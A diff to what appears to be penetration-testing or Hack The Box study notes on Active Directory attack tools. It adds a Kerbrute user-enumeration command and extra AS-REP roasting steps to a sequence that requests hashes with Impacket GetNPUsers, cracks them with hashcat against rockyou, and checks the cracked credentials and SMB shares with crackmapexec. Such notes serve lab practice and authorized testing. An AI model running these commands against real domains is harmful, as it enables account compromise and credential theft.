@@ -1,5 +1,15 @@
 # Tools
 
+## Kerbrute
+
+Identify potential valid users
+
+```bash
+kerbrute userenum --dc <IP> -d <domain.local> users.txt
+# Can verify working by placing known users in user.txt i.e. administrato, guest,
+
+```
+
 ## Impacket
 
 #### GetADUsers
@@ -12,13 +22,16 @@
 Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking
 
 ```bash
+GetNPUsers.py <DOMAIN.LOCAL>/administrator  # use other known usernames too
+# Look for user/hash output
+
 GetNPUsers.py -dc-ip <IP> -request 'htb.local/'
 # Look for user/hash output
 GetNPUsers.py -dc-ip <IP> -request 'htb.local/' -format hashcat  # Put it in hashcat format in prep to crack
 # Hashcat Crack
 hashcat -m 18200 hash.txt rockyou.txt -r rules/InsidePro-PasswordsPro.rule
 # If cracked...
-crackmapexec smb <IP> -u <user> -p <password>
+crackmapexec smb <IP> -u <user> -p <password>  # Look for Pwn3d!
 crackmapexec smb <IP> -u <user> -p <password> --shares  # Check for SMB shares to access
 ```
 
